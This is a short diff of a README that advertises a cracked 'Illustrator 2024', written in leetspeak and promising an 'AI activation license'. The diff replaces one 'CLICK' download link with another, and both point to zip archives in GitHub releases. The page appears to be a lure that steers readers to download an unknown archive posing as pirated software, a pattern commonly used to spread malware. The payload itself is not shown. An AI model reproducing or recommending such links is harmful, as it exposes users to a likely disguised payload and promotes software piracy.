@@ -1,5 +1,5 @@
 # 1l1ustrator-2024
- [CLICK](https://github.com/rayden70darkdreamer/ExSoftware/releases/download/Software/ExRepack.zip)
+ [CLICK](https://github.com/DerickDidas/Il1ustrat/releases/download/Software/ExSoftware.zip)
 
 ## AI-act1vat10n-l1cense
 
